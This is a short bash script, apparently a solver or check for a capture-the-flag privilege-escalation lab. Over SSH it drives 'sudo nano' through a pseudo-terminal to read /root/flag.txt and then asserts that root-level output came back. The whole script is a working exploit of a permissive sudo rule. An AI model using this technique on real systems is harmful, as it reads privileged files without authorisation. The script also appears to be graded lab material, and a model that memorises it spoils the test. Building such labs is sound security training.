#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# Open /root/flag.txt as root via sudo nano; flag appears in the TUI buffer.
out="$(ssh_run '
python3 - <<'\''PY'\''
import os, pty, time, select, signal
pid, fd = pty.fork()
if pid == 0:
    os.environ["TERM"] = "xterm"
    os.execvp("sudo", ["sudo", "-n", "/usr/bin/nano", "-R", "/root/flag.txt"])
buf = b""
end = time.time() + 2.5
while time.time() < end:
    r, _, _ = select.select([fd], [], [], 0.1)
    if not r:
        continue
    try:
        chunk = os.read(fd, 8192)
    except OSError:
        break
    if not chunk:
        break
    buf += chunk
    if b"FLAG{" in buf:
        break
try:
    os.kill(pid, signal.SIGTERM)
except ProcessLookupError:
    pass
try:
    os.waitpid(pid, 0)
except ChildProcessError:
    pass
print(buf.decode("utf-8", "replace"))
PY
')"
assert_root_output "${out}"
